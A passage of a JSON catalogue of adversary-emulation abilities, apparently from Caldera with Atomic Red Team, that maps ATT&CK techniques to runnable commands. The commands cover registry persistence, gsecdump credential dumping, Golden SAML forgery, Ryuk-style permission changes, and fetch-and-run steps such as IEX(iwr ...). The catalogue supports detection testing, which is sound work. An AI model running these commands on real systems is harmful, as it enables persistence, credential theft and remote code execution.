"samaccountname", "json_type": "str"}, "edge": "", "target": "", "source": "domain.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "GetServiceAccounts", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\" ; Remove-Item $SilentProcessExit -force; $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"; Remove-Item $registryPath -force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$Name = \"GlobalFlag\"; $Value = \"512\"; $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"; New-Item -Path $registryPath -Force; New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force; $Name = \"ReportingMode\"; $Value = \"1\"; $SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\"; New-Item -Path $SilentProcessExit -Force; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force ; $Name = \"MonitorProcess\"; $Value = \"cmd.exe /c calc.exe\"; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force; Start-Process whoami.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Image File Execution Options Injection", "ability_id": "7f43a2b144f2534eb979d2b6638e0283", "technique_id": "T1546.012", "tactic": "multiple", "requirements": [], "name": "GlobalFlags in Image File Execution Options", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Compile a c file with either gcc or clang on Linux or Macos.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["a932ec_T1027-004-test.go"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -e  a932ec_T1027-004-test.go ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O a932ec_T1027-004-test.go; fi;  ;  go run a932ec_T1027-004-test.go", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["a932ec_T1027-004-test.go"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -e  a932ec_T1027-004-test.go ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O a932ec_T1027-004-test.go; fi;  ;  go run a932ec_T1027-004-test.go", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Compile After Delivery", "ability_id": "4cbe4aebe95c5729526b5d0325c4de0b", "technique_id": "T1027.004", "tactic": "defense-evasion", "requirements": [], "name": "Go compile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["try{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"; $file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"; Start-Process $file1 /S;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "af8cb2bf9b436aae5c106a0a9c207e14", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "GoToAssist Files Detected Test on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Import-Module AADInternals -Force; $saml = New-AADIntSAMLToken -ImmutableID \"aehgdqBTZV50DKQZmNJ8mg==\" -PfxFileName \".\\ADFS_signing.pfx\" -Issuer \"http://contoso.com/adfs/services/trust/\"; $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache; if ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }; Write-Host \"End of Golden SAML\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Forge Web Credentials: SAML token", "ability_id": "502b7914aac58f15708500e3ec62526b", "technique_id": "T1606.002", "tactic": "credential-access", "requirements": [], "name": "Golden SAML", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this atomic we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["icacls 'C:\\Users\\Public\\*' /restore %temp%\\T1222.001-folder-perms-backup.txt /q >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "icacls \"C:\\Users\\Public\\*\" /grant Everyone:F /T /C /Q", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "ability_id": "06d6ac81dae5c0f49dd3d5641eb2c81e", "technique_id": "T1222.001", "tactic": "defense-evasion", "requirements": [], "name": "Grant Full Access to folder for Everyone - Ryuk Ransomware Style", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["d06deb_griffon_recon.vbs"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cscript d06deb_griffon_recon.vbs", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "f3d8f2ef5a4cbe2e39f093f31c62f38f", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Griffon Recon", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe -a", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping", "ability_id": "27fa36b2a66d4c2ce6c0198854cda800", "technique_id": "T1003", "tactic": "credential-access", "requirements": [], "name": "Gsecdump", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"; if (!(Test-Path -path $path)){;   New-Item -ItemType Key -Path $path; }; New-ItemProperty -Path $path -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution", "ability_id": "495536c73651969fd80a8f263c293194", "technique_id": "T1546", "tactic": "multiple", "requirements": [], "name": "HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "23000b943f18392d477ad7a1cad6586c", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "HKCU - Policy Settings Explorer Run Key", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore; Remove-Item \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"#{payload}\" -Force ; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Active Setup", "ability_id": "22f293978e324252426f9c7e337ae181", "technique_id": "T1547.014", "tactic": "multiple", "requirements": [], "name": "HKLM - Add atomic_test key to launch executable as part of user setup", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"StubPath\" -Force; Remove-ItemProperty \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"#{payload}\" -Force; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Active Setup", "ability_id": "b45598708fd9e5b197cb58cf193f4778", "technique_id": "T1547.014", "tactic": "multiple", "requirements": [], "name": "HKLM - Add malicious StubPath value to existing Active Setup Entry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\"; Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \" #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "55e14d8b479b905a13976c8d94016a7b", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "HKLM - Append Command to Winlogon Userinit KEY Value", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$oldvalue\"; Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \", #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "29797527e006f065df5c2d1f7b1b0b56", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "HKLM - Modify default System Shell - Winlogon Shell KEY Value ", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution", "ability_id": "50a9be8bbff4d4ffe0b699cb8d040c6d", "technique_id": "T1546", "tactic": "multiple", "requirements": [], "name": "HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "0a3220a423ed7c7804af6e3587ad8811", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "HKLM - Policy Settings Explorer Run Key", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Active Setup", "ability_id": "7ad5840a79f3259965fa28835dda93c4", "technique_id": "T1547.014", "tactic": "multiple", "requirements": [], "name": "HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without userinteraction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$user = [System.Environment]::UserName; Remove-Item -Path C:\\Users\\$user\\Downloads\\FeelTheBurn.iso"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html) { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1027.006\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"};  ;  PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "HTML Smuggling", "ability_id": "6a8261d005f99ebd1de200d3cb11cef5", "technique_id": "T1027.006", "tactic": "defense-evasion", "requirements": [], "name": "HTML Smuggling Remote Payload", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf PathToAtomicsFolder/T1059.004/src/AutoSUID.sh"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chmod +x PathToAtomicsFolder/T1059.004/src/AutoSUID.sh; bash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "1aa4061e002213b7c1e0985f68d4e18c", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Harvest SUID executable files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -name mshta"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "98adc43648b0e4ea6e90a88ad5ae4b3d", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "Headless Chrome code execution via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256); printf $ENCODED | xxd -r -p; echo $ENCODED | xxd -r -p; echo $(echo $ENCODED) | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256); printf $ENCODED | xxd -r -p; echo $ENCODED | xxd -r -p; 